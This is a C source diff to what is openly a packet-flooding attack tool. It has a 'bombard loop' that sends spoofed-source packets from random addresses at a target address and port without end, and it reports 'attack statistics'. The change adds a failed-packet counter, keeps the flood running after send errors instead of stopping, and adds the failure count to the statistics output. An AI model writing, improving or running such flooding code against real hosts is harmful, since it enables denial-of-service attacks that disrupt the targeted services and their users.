@@ -75,6 +75,7 @@ time_t dur = 0; 		// attack duration in seconds (0 = inf)
 time_t sttime; 			// attack start time
 
 static atomic_size_t nsent = 0; // total number of packets sent
+static atomic_size_t nfail = 0; // total number of failed packages
 
 // generate a random IP address
 static in_addr_t rand_addr()
@@ -262,7 +263,9 @@ void *pthread_conn(void *args)
 {
 	// initialize connection
 	struct conn_conf con;
-	init_conn(&con, inet_addr(dst_addr), dst_port, payload);
+	if (init_conn(&con, inet_addr(dst_addr), dst_port, payload) < 0) {
+		return NULL;
+	}
 
 	// bombard loop
 	while (1) {
@@ -276,10 +279,8 @@ void *pthread_conn(void *args)
 		}
 
 		spoof_pkt(&con);
-		if (snd_pkt(&con) < 0) {
-			perror("snd_pkt");
-			break;
-		}
+		if (snd_pkt(&con) < 0)
+			++nfail;
 	}
 
 	return NULL;
@@ -408,9 +409,10 @@ int main(int argc, char **argv)
 		size_t pps = nsent / tdiff;
 		size_t kibps = (pps * pktlen) / 1024;
 
-		puts("\033[6A\rattack statistics:");
-		printf("time elapsed:\t\t%02u:%02u:%02u\n", h, m, s);
-		printf("total packets sent:\t%lu\n", nsent);
+		puts("\033[7A\rattack statistics:");
+		printf("time elapsed:\t\t%02u:%02u:%02u          \n", h, m, s);
+		printf("packets sent:\t\t%lu                       \n", nsent);
+		printf("packets failed:\t\t%lu                     \n", nfail);
 		printf("throughput (packets):\t%lu packets/sec       \n", pps);
 		printf("throughput (data):\t%lu KiB/sec          \n\n", kibps);
 
